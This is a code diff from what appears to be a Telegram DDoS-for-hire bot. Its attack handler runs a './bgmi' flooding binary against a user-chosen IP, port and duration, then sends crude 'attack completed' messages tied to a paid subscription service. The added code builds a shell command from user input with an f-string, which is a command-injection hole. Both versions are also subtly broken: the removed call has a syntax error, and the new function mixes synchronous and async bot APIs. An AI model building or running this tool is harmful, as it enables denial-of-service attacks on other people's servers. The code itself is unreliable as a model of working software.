@@ -149,32 +149,21 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Run attack in background
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
-async def run_attack(chat_id, ip, port, duration, context):
-    """Execute the actual attack"""
+async def run_attack_command_async(chat_id, target_ip, target_port, duration):
+    global attack_in_progress
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 10")
+    await process.communicate()
+    attack_in_progress = False
+    attack_stop_event.set()  # Signal the countdown thread to stop
+    # Notify completion
     try:
-        process = await asyncio.create_subprocess_exec(
-            "./bgmi", {target_ip} {target_port} {duration} 10),
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-        
-        if stdout:
-            logger.info(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            logger.error(f"[stderr]\n{stderr.decode()}")
-            
+        bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n"
+                                   "*The attack has been successfully executed.*\n"
+                                   "*Thank you for using our service!*",
+                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
     except Exception as e:
-        logger.error(f"Attack error: {e}")
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-    finally:
-        message = (
-            "*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅*\n"
-            "*😈 Bas maal gir gya! 💦💦💦*\n"
-            "*BGMI KO CHODNE WALE FEEDBACK DE @DarkDdosOwner!*"
-        )
-        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-
+        logging.error(f"Error sending completion message: {e}")
+        
 async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Admin command to add user subscription"""
     if update.effective_user.id != ADMIN_USER_ID:
